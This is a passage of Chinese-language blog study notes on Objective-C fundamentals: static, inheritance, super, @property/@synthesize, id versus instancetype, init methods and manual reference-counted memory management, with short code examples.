title="static"></a>static</h3><p>(1)C语言中的static<br>a、修饰局部变量<br>b、修饰全局变量<br>c、修饰函数</p><p>(2)OC中的static关键字<br>a、static不能修饰属性，也不能修饰方法<br>b、static可以修饰方法中的局部变量<br>如果方法中的局部变量被static修饰，这个变量就会变成静态变量存储在常量区，当方法执行完毕之后，不会回收，下次再执行这个方法的时候，直接使用，而不用再次声明</p><h4 id="查看类在代码段地址方式"><a href="#查看类在代码段地址方式" class="headerlink" title="查看类在代码段地址方式"></a>查看类在代码段地址方式</h4><ol><li>调试查看isa指针</li><li>类方法中打印self指针</li><li>调用对象或类的class方法</li></ol><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@interface 类名: 父类</span><br><span class="line">&#123;</span><br><span class="line">       //成员变量声明</span><br><span class="line">&#125;</span><br><span class="line">       //方法声明</span><br><span class="line">@end</span><br></pre></td></tr></table></figure><p>OC类只能有一个直接父类，但是可以有无限多个间接父类。Objective C 不支持多重继承, 而 C++ 支持.</p><p>oc的继承具有：1.单根性  2.传递性</p><h4 id="NSObject类"><a href="#NSObject类" class="headerlink" title="NSObject类"></a>NSObject类</h4><p>Foundation框架中的一个类，在这个类中有一个new方法，用于创建对象，所有类都必须直接或间接继承NSObject类</p><h4 id="super关键字"><a href="#super关键字" class="headerlink" title="super关键字"></a>super关键字</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">只需要利用super 给 父类的方法 发送一个消息, 那么系统就会自动调用父类的方法</span><br><span class="line">如果以后想在 子类中调用 父类的方法 可以使用super</span><br><span class="line">如果想在给 父类方法 进行扩展的同时 保留父类的方法, 那么可以使用super调用父类同名的方法</span><br></pre></td></tr></table></figure><p><strong>super</strong> 是个编译器的指令符号, 只是告诉编译器在执行的时候,去调谁的方法. </p><p>self 是一个隐私参数 </p><p>super 并不是隐藏的参数，它只是一个“编译器指示符”，它和 self 指向的是相同的消息接收者</p><ol><li><p>super 的作用 </p><ul><li><p>直接调用父类中的某个方法 </p></li><li><p> super 在对象方法中，那么就会调用父类的对象方法 </p></li><li><p>super 在类方法中，那么就会调用父类的类方法 </p></li><li><p>子类的类方法中，可以使用super关键字调用弗父类方法</p></li><li><p>super只能调用父类的方法，不能访问属性</p></li><li><p>super特指当前类或者对象的该方法从父类继承过来的</p></li></ul></li><li><p>使用场合 </p></li></ol><p>​            子类重写父类的方法时想保留父类的一些行为</p><h3 id="访问修饰符"><a href="#访问修饰符" class="headerlink" title="访问修饰符"></a>访问修饰符</h3><p>@private</p><p>@protected</p><p>@package</p><p>@public</p><p>默认protected</p><p>属性定义在implementation中为真私有，外界不会提示</p><p>方法不写声明，只写实现，则为私有方法</p><h4 id="里氏替换原则"><a href="#里氏替换原则" class="headerlink" title="里氏替换原则"></a>里氏替换原则</h4><p>里氏代换原则(Liskov Substitution Principle LSP)面向对象设计的基本原则之一。  里氏代换原则中说，任何基类可以出现的地方，子类一定可以出现。  LSP是继承复用的基石，只有当衍生类可以替换掉基类，软件单位的功能不受到影响时，基类才能真正被复用，而衍生类也能够在基类的基础上增加新的行为。里氏代换原则是对“开-闭”原则的补充。实现“开-闭”原则的关键步骤就是抽象化。而基类与子类的继承关系就是抽象化的具体实现，所以里氏代换原则是对实现抽象化的具体步骤的规范。</p><p>派生的基石</p><ol><li>一个基类指针不仅能存基类对象，还能指向派生类对象，此时只能访问派生类对象中的基类成员，没法访问派生类中独有的成员；如果同一方法重写过，则和c++一样会引发多态</li><li>如果指针为NSObject类型，那么这个指针可以存储任意OC对象的地址</li></ol><h4 id="“-”"><a href="#“-”" class="headerlink" title="“%@”"></a>“%@”</h4><p>使用%@打印对象时，底层方法：</p><ol><li><p>调用传入对象的description方法</p><p>dscription定义在NSObject类之中，每个oc对象都有，返回字符串格式@“&lt;对象所属类名:对象的地址&gt;”</p><p>可以通过重写description方法改变输出格式</p></li><li><p>拿到该方法的返回值，返回值为1字符串</p></li><li><p>将字符串打印出来</p></li></ol><p><img src="https://raw.githubusercontent.com/zengxiang21/img/main/img/202204181443655.png" alt="image-20220418144332543"></p><p><img src="https://img-blog.csdnimg.cn/20210314205733608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dpdGh1Yl8zNjg1MDk5Nw==,size_16,color_FFFFFF,t_70" alt="img"></p><h4 id="代码段存储类的步骤"><a href="#代码段存储类的步骤" class="headerlink" title="代码段存储类的步骤"></a>代码段存储类的步骤</h4><ol><li>在代码段创建一个Class对象，Class类是Foundation类中的一个类，该Class对象就是用来存储类信息</li><li>将类的信息存储在Class对象之中</li></ol><p>类是以Class对象存储在代码段</p><p><img src="https://upload-images.jianshu.io/upload_images/6545546-68ba4df535430268.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p><h3 id="SEL"><a href="#SEL" class="headerlink" title="SEL"></a>SEL</h3><p>selector选择器，数据类型，所以在内存中申请空间存储数据</p><p>SEL是一个类，SEL对象</p><p>Class对象不仅要存类名，还要存类方法</p><ol><li>先创建一个SEL对象</li><li>将方法的信息存在SEL对象中</li><li>SEL是一个typedef类型，自定义时已经加*，声明SEL时不需要加星号</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SEL　变量名　=　@selector(方法名字); </span><br></pre></td></tr></table></figure><p>[p1 sayHi]实现原理：</p><ol><li>先拿到存储sayHi方法的SEL对象，也就是拿到存储sayHi方法的SEL数据。SEL消息</li><li>将这个SEL消息发给p1对象</li><li>这个时候p1对象接收到SEL消息以后，知道要调用方法</li><li>根据对象的isa指针找到存储类的类对象</li><li>找到累对象，搜寻是否有与传入的SEL数据一致的</li></ol><h4 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h4><p>1.OC代码调用；</p><p>2.NSObject的performSelector调用；</p><p>如果方法名有冒号，则要带着冒号</p><p>如果有参数，使用performSelector: withObject:</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用."></a>使用.</h4><p>赋值调用setter</p><p>取值调用getter</p><h4 id="setter和getter"><a href="#setter和getter" class="headerlink" title="setter和getter"></a>setter和getter</h4><p>setter必须以set开头加属性首字母大写setAge</p><h3 id="语法"><a href="#语法" class="headerlink" title=".语法"></a>.语法</h3><p>对象名.去掉下划线属性名</p><p>如果没有封装getter和setter方法就没法使用.语法</p><h3 id="property"><a href="#property" class="headerlink" title="@property"></a>@property</h3><p>自动生成getter和setter的声明，写在@interface中</p><p>@property 数据类型 属性名</p><p>@property int age</p><ol><li>@property只是生成getter  setter 的声明.<br>@synthesize是生成getter  setter 的实现.</li></ol><pre><code> 这种写法是Xcode4.4之前的写法. 从Xcode4.4以后.Xcode对@property做了1个增强</code></pre><ol start="2"><li><p>@property增强</p><p>只需要写1个@property 编译器就会自动</p><ol><li>生成私有属性.</li><li>.生成getter setter的声明.</li><li>.生成getter setter的实现.</li></ol></li></ol><pre><code> @property NSString *name;  做的事情 1). 自动的生成1个私有属性,属性的类型和@property类型一致 属性的名称和@property的名称一致 属性的名称自动的加1个下划线.  2). 自动的生成这个属性的getter setter方法的声明  3). 自动的生成这个属性的getter setter方法的实现.      setter的实现: 直接将参数的值赋值给自动生成的私有属性.     getter的实现: 直接返回生成的私有属性的值.</code></pre><p>  3.使用注意.</p><pre><code>1). @property的类型一定要和属性的类型一致.     名称要和属性的名称一致 只是去掉下划线.2). 也可以批量声明相同类型的@property3). @property生成的方法实现没有做任何逻辑验证.     setter: 直接赋值    getter： 直接返回.     所以,我们可以重写setter来自定义验证逻辑.如果重写了setter 还会自动生成getter    如果重写了getter 还会自动生成setter     如果同时重写getter setter 那么就不会自动生成私有属性了.</code></pre><ol start="4"><li>如果你想为类写1个属性 并且为这个属性封装getter setter<br>1个@property就搞定.</li></ol><ol start="5"><li>继承.<br>父类的@property一样可以被子类继承.<br>@property生成的属性是私有的 在子类的内部无法直接访问生成的私有属性。<br>但是可以通过setter getter来访问。</li></ol><h3 id="synthesize"><a href="#synthesize" class="headerlink" title="@synthesize"></a>@synthesize</h3><p>@property只能声明，@synthesize则可以实现getter和setter</p><p>@synthesize+@property名字</p><p>@synthesize+@property名字=已经存在的属性名字</p><p>@synthesize age</p><ul><li><p>@synthesize student;   等价于 @synthesize student = student</p><p>会生成私有属性student</p></li><li><p>@synthesize student = _student</p><p>不会生成私有属性，直接使用_student</p><h4 id="以后只需要写-property，编译器会自动补充"><a href="#以后只需要写-property，编译器会自动补充" class="headerlink" title="以后只需要写@property，编译器会自动补充"></a>以后只需要写@property，编译器会自动补充</h4><p>同时重写getter和setter那么就不会自动生成私有属性</p></li></ul><p>OC是弱类型语言，编译器不会报错</p><h3 id="静态类型和动态类型"><a href="#静态类型和动态类型" class="headerlink" title="静态类型和动态类型"></a>静态类型和动态类型</h3><p>静态类型：一个指针指向本类对象</p><p>动态类型：一个指针指向非本类对象</p><h3 id="NSObject"><a href="#NSObject" class="headerlink" title="NSObject"></a>NSObject</h3><p>是OC中所有类的基类，根据LSP可以指向任意OC对象</p><p>NSObject是万能指针</p><p>如果要调用指向之类对象的方法，就要做强制类型转换</p><h3 id="id指针"><a href="#id指针" class="headerlink" title="id指针"></a>id指针</h3><p>万能指针，可以指向任意的OC对象</p><p>id id1=[Person new]</p><p>typedef struct objc_object *id</p><p>id声明时不需要加*</p><h4 id="id指针和NSObject区别"><a href="#id指针和NSObject区别" class="headerlink" title="id指针和NSObject区别"></a>id指针和NSObject区别</h4><p> 相同点: 万能指针 都可以执行任意的OC对象.</p><p> 不同点: 通过NSObject指针去调用对象的方法的时候.编译器会做编译检查.<br>        通过id类型的指针去调用对象的方法的时候,编译器直接通过.无论你调用什么方法.</p><p> 注意: id指针只能调用对象的方法  不能使用点语法.如果使用点语法就会直接报编译错误 。<br> 如果我们要声明1个万能指针 千万不要使用NSObject 而是使用id</p><h4 id="父类中的类方法创建1个父类对象返回"><a href="#父类中的类方法创建1个父类对象返回" class="headerlink" title="父类中的类方法创建1个父类对象返回."></a>父类中的类方法创建1个父类对象返回.</h4><p> 1). 如果返回值写为父类类型的.那么子类来调用这个方法得到的就是父类指针.<br>     解决的方式: 把返回值改为id类型的.</p><p> 2). 方法的内部创建的对象的是 不要写死. 因为写死创建的对象就固定了.<br>     我们希望那1个类来调用这个方法就创建那1个类的对象.</p><p>​     把类名写为self 那1个类来调用这个方法 self就指的是那1个类.创建的就是那1个类的对象.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(id) person&#123;</span><br><span class="line">return [self new]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 3). 方法的返回值是id类型的.问题就是任意指针都可以接收这个方法的返回值.<br>     编译器连个警告都没有.</p><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">NSString</span> * str=[Person person]</span><br></pre></td></tr></table></figure><p>​     如果方法的返回值是instancetype<br>​     代表方法的返回值是当前这个类的对象.</p><h4 id="一、什么是instancetype"><a href="#一、什么是instancetype" class="headerlink" title="一、什么是instancetype"></a>一、什么是instancetype</h4><p>instancetype是clang 3.5开始提供的一个关键字，表示某个方法返回的未知类型的OC对象。<br> 之前就接触过关键字<strong>id</strong>也可以用来表示未知类型的对象，那这两个有什么区别呢？</p><h4 id="二、id和instancetype的区别"><a href="#二、id和instancetype的区别" class="headerlink" title="二、id和instancetype的区别"></a>二、id和instancetype的区别</h4><h5 id="区别一"><a href="#区别一" class="headerlink" title="区别一"></a>区别一</h5><p>·instancetype用来在编译期确定实例的类型<br> ·id在编译时期编译器不检查类型，只能返回未知类型的对象，调用任何方法不会给出错误提示</p><h5 id="区别二"><a href="#区别二" class="headerlink" title="区别二"></a>区别二</h5><p>·instancetype只能作为返回值<br> ·id既可以作为返回值也可以作为参数</p><h5 id="区别三"><a href="#区别三" class="headerlink" title="区别三"></a>区别三</h5><p>·对于init方法，id和instancetype是没有区别的，因为编译器会把id优化成instancetype，当明确返回类型就是当前class时，使用instancetype能避免id带来的编译不出错误的情况。</p><p>1). 如果方法内部是在创建当前类的对象,不要写死成类名 【类名 new】;<br>         而是用self代替类名.</p><p>2). 如果方法的返回值是当前类的对象,也不要写死了. 而是写instancetype</p><h3 id="动态检测"><a href="#动态检测" class="headerlink" title="动态检测"></a>动态检测</h3><p> 1). 判断对象中是否有这个方法可以执行.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(BOOL)respondsToSelector:(SEL)aSelector;</span><br><span class="line">最常用的是这个方法. </span><br><span class="line">Person *p1 = [Person new];</span><br><span class="line">[p1 sayHi];</span><br><span class="line">BOOL b1=[p1 respondsToSelector:@selector(length)]</span><br></pre></td></tr></table></figure><p> 2). 判断类中是否有指定的类方法.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(BOOL)instancesRespondToSelector:(SEL)aSelector;</span><br></pre></td></tr></table></figure><p> 3). 判断指定的对象是否为 指定类的对象或者子类对象.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(BOOL)isKindOfClass:(Class)aClass;</span><br><span class="line">BOOL b1 = [s1 isKindOfClass:[Person class]];</span><br><span class="line">判断s1对象是否为Person对象或者Person的子类对象.</span><br></pre></td></tr></table></figure><p> 3). 判断对象是否为指定类的对象 不包括子类.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(BOOL)isMemberOfClass:(Class)aClass;</span><br><span class="line">s1 isMemberOfClass:[Student class]];</span><br><span class="line">判断s1对象是否为1个Student对象. 不包括Student的子类对象.</span><br></pre></td></tr></table></figure><p> 4). 判断类是否为另外1个类的子类.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(BOOL)isSubclassOfClass:(Class)aClass;</span><br></pre></td></tr></table></figure><ol><li><p>创建对象,我们之前说:</p><p>类名 *指针名 =  [类名  new];</p><p>new实际上是1个类方法.</p><p>new方法的作用:<br>-&gt; 创建对象。<br>-》 初始化对象<br>-&gt; 把对象的地址返回.</p></li></ol><pre><code> new方法的内部,其实是先调用的alloc方法. 再调用的init方法.  alloc方法是1个类方法,作用: 那1个类调用这个方法 就创建那个类的对象,并把对象返回. init方法 是1个对象方法,作用: 初始化对象.  创建对象的完整步骤: 应该是先使用alloc创建1个对象,然后再使用init初始化这个对象 才可以使用这个对象. 虽然没有初始化的对象 有的时候 也可以使用. 但是千万不要这么做. 使用1个未经初始化的对象是极其危险的.  Person *p1 = [Person new]; 完全等价于 Person *p1 = [[Person alloc] init];</code></pre><p>​<br>  2. init方法.</p><pre><code> 作用: 初始化对象,为对象的属性赋初始值 这个init方法我们叫做构造方法.      init方法做的事情:初始化对象.      为对象的属性赋默认值.            如果属性的类型是基本数据类型就赋值为0                    C指针           NULL                    OC指针          nil 所以.我们创建1个对象如果没有为这个对象的属性赋值 这个对象的属性是有默认值的. 所以,我们每次新创建1个对象,这个对象的属性都被初始化了.</code></pre><ol start="3"><li><p>我们想要让创建的对象的属性的默认值不是 nil NULL 0<br>而是我们自定义的.<br>那么这个时候,我们就可以重写init方法. 在这个方法中按照我们自己的想法为对象的属性赋值.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">重写init方法的规范:</span><br><span class="line">1). 必须要先调用父类的init方法.然后将方法的返回值赋值给self</span><br><span class="line"></span><br><span class="line">2). 调用init方法初始化对象有可能会失败,如果初始化失败.返回的就是nil</span><br><span class="line"></span><br><span class="line">3). 判断父类是否初始化成功. 判断self的值是否为nil 如果不为nil说明初始化成功.</span><br><span class="line"></span><br><span class="line">4). 如果初始化成功 就初始化当前对象的属性.</span><br><span class="line"></span><br><span class="line">5). 最后 返回self的值.</span><br></pre></td></tr></table></figure></li></ol><pre><code> 解惑 1). 为什么要调用父类的init方法.     因为父类的init方法 会初始化父类的属性. 所以必须要保证当前对象中的父类属性也同时被初始化.  2). 为什么要赋值给self？     因为.调用父类的init方法 会返回初始化成功的对象     实际上返回的就是当前对象。但是我们要判断是否初始化成功.  无论如何,记住重写init方法的规范.  - (instancetype)init &#123;     if(self = [super init])     &#123;        //初始化当前类的属性的代码;     &#125;     return self; &#125;  什么时候需要重写init方法: 如果你希望创建出来的对象的属性的默认值不是 nil NULL 0 而是我们指定的值. 那么这个时候我们就可以重写init方法.</code></pre><ol start="3"><li><p>重写init方法以后.<br> 稍稍不爽的: 这样每次创建出来的对象的属性的值都是一样的.</p><p> 创建对象的时候,对象的属性的值由创建对象的人来指定.而不是写死在init方法中</p><p> <img src="https://raw.githubusercontent.com/zengxiang21/img/main/img/202204201643587.png" alt="image-20220420164341957"></p></li></ol><pre><code> 自定义构造方法.  规范: 1). 自定义构造方法的返回值必须是instancetype 2). 自定义构造方法的名称必须以initWith开头. 3). 方法的实现和init的要求一样.   Dog *d1 = [[Dog alloc] initWithName:@&quot;小黄&quot; andAge:2];  Person *p1 = [[Person alloc] initWithName:@&quot;小明&quot; andAge:19 andWeight:56.3f andHeight:175.4f];</code></pre><h3 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">  1. 内存管理</span><br><span class="line">     内存的作用:存储数据.</span><br><span class="line"> </span><br><span class="line">     1). 如何将数据存储到内存之中.</span><br><span class="line">         声明1个变量.然后将数据存储进去.</span><br><span class="line"> </span><br><span class="line">     2). 当数据不再被使用的时候,占用的内存空间如何被释放.</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  2. 内存中的五大区域</span><br><span class="line"> </span><br><span class="line">     栈: 局部变量. 当局部变量的作用域被执行完毕之后,这个局部变量就会被系统立即回收.</span><br><span class="line">     堆: OC对象.使用C函数申请的空间.</span><br><span class="line">     BSS段: 未初始化的全局变量、静态变量. 一旦初始化就回收 并转存到数据段之中.</span><br><span class="line">     数据段: 已经初始化的全局变量、静态变量. 直到程序结束的时候才会被回收.</span><br><span class="line">     代码段: 代码. 程序结束的时候,系统会自动回收存储在代码段中的数据.</span><br><span class="line"> </span><br><span class="line">     栈、BSS段、数据段、代码段存储在它们中的数据的回收,是由系统自动完成的.不需要我们干预.</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  3. 分配在堆区中的OC对象,是肯定需要被回收的.</span><br><span class="line"> </span><br><span class="line">     iPhone 内存机制.</span><br><span class="line"> </span><br><span class="line">     40M 警告</span><br><span class="line">     45M 警告</span><br><span class="line">     120M 闪退.</span><br><span class="line"> </span><br><span class="line">     存储在堆中的OC对象,系统不会自动回收. 直到程序结束的时候才会被回收.</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  4. 内存管理的范围:</span><br><span class="line">     只需要管理存储在堆中的OC对象的回收.其他区域中的数据的回收是系统自动管理的.</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  5. 对象应该什么时候被回收?</span><br><span class="line"> </span><br><span class="line">     当有人使用这个对象的时候,这个对象就千万不能回收.</span><br><span class="line">     只有在没有任何人使用这个对象的时候,才可以回收.</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  6. 引用计数器</span><br><span class="line">     </span><br><span class="line">     1). 每1个对象都有1个属性.叫做retainCount.叫做引用计数器. 类型是unsigned long 占据8个字节.</span><br><span class="line">         引用计数器的作用: 用来记录当前这个对象有多少个人在使用它.     </span><br><span class="line">         默认情况下,创建1个对象出来 这个对象的引用计数器的默认值是1.</span><br><span class="line"> </span><br><span class="line">     2). 当多1个人使用这个对象的时候.应该先让这个对象的引用计数器的值+1 代表这个对象多1个人使用.</span><br><span class="line"> </span><br><span class="line">     3). 当这个对象少1个人使用的时候.应该先让这个对象的引用计数器的值-1 代表这个对象少1个人使用.</span><br><span class="line"> </span><br><span class="line">     4). 当这个对象的引用计数器变为0的时候.代表这个对象无人使用. 这个时候系统就会自动回收这个对象.</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  7. 如何操作引用计数器.</span><br><span class="line"> </span><br><span class="line">     1). 为对象发送1条retain消息. 对象的引用计数器就会加1. 当多1个人使用对象的时候才发.</span><br><span class="line"> </span><br><span class="line">     2). 为对象发送1条release消息.对象的引用计数器就会减1. 当少1个人使用对象的时候才发.</span><br><span class="line"> </span><br><span class="line">     3). 为对象发送1条retainCount消息. 就可以去到对象的引用计数器的值.</span><br><span class="line"> </span><br><span class="line">     就这样++ -- 当对象的引用计数器变为0的时候,对象就会被系统立即回收.</span><br><span class="line"> </span><br><span class="line">     在对象被回收的时候.会自动调用对象的dealloc方法.</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  8. 内存管理的分类</span><br><span class="line"> </span><br><span class="line">     MRC: Manual Reference Counting 手动引用计数.手动内存管理.</span><br><span class="line"> </span><br><span class="line">          当多1个人使用对象的时候,要求程序员手动的发送retain消息.少1个人使用的时候程序员手动的发送relase消息.</span><br><span class="line"> </span><br><span class="line">     2011年之前 iOS5之前</span><br><span class="line">     ARC: Automatic Reference Counting  自动引用计数.自动内存管理.</span><br><span class="line">          系统自动的在合适的地方发送retain relase消息.</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">     我们今天学习的MRC.</span><br><span class="line">     学习MRC的理由:</span><br><span class="line">     1). 面试必考 100%</span><br><span class="line">     2). 早期的APP开发使用的MRC技术.</span><br><span class="line">     3). iOS大牛都是从MRC成长起来的. 方便交流.</span><br><span class="line">     4). ARC是基于MRC</span><br><span class="line">  </span><br><span class="line"> */</span><br></pre></td></tr></table></figure><h3 id="第一个MRC程序"><a href="#第一个MRC程序" class="headerlink" title="第一个MRC程序"></a>第一个MRC程序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"></span><br><span class="line">  1. iOS5开始. Xcode4.2开始就支持ARC</span><br><span class="line">     Xcode7 默认支持ARC开发.</span><br><span class="line">     默认使用的开发方式就是ARC的模式.</span><br><span class="line"></span><br><span class="line">     关闭ARC开启MRC.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  2. 当对象的引用计数器变为0的时候,系统会自动回收对象.</span><br><span class="line">     在系统回收对象的时候.会自动的调用对象的dealloc方法.</span><br><span class="line"></span><br><span class="line">     重写dealloc方法的规范:</span><br><span class="line">     必须要调用父类的dealloc方法. 并且要放在最后一句代码.</span><br><span class="line">     子类的某些对象实例是继承自父类的。因此，我们需要调用父类的dealloc方法，</span><br><span class="line">来释放父类。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  3. 测试引用计数器.</span><br><span class="line"></span><br><span class="line">     1). 新创建1个对象,这个对象的引用计数器的值默认是1.</span><br><span class="line">     2). 当对象的引用计数器变为0的时候.对象就会被系统立即回收 并自动调用dealloc方法.</span><br><span class="line">     3). 为对象发送retain消息 对象的引用计数器就会+1</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    4. 为对象发送release消息.并不是回收对象.而是让对象的引用计数器-1</span><br><span class="line">       当对象的引用计数器的值变为0的时候.对象才会被系统立即回收.</span><br><span class="line"></span><br><span class="line"> */</span><br></pre></td></tr></table></figure><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Person.m</span></span><br><span class="line"><span class="meta">#import <span class="meta-string">&quot;Person.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">Person</span></span></span><br><span class="line">-(<span class="keyword">void</span>)dealloc&#123;</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;%@ is dead.&quot;</span>,_name);</span><br><span class="line">    [<span class="keyword">super</span> dealloc];</span><br><span class="line">&#125;</span><br><span class="line">-(<span class="keyword">void</span>) sayHi&#123;</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;Hello&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line">    </span><br><span class="line"> </span><br><span class="line"><span class="comment">//Person.h</span></span><br><span class="line"><span class="meta">#import <span class="meta-string">&lt;Foundation/Foundation.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">Person</span> : <span class="title">NSObject</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">strong</span>) <span class="built_in">NSString</span> *name;</span><br><span class="line"><span class="keyword">@property</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">-(<span class="keyword">void</span>)dealloc;</span><br><span class="line">-(<span class="keyword">void</span>)sayHi;</span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//main.m</span></span><br><span class="line"><span class="meta">#import <span class="meta-string">&lt;Foundation/Foundation.h&gt;</span></span></span><br><span class="line"><span class="meta">#import <span class="meta-string">&quot;Person.h&quot;</span></span></span><br><span class="line"><span class="keyword">int</span> main(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[]) &#123;</span><br><span class="line"></span><br><span 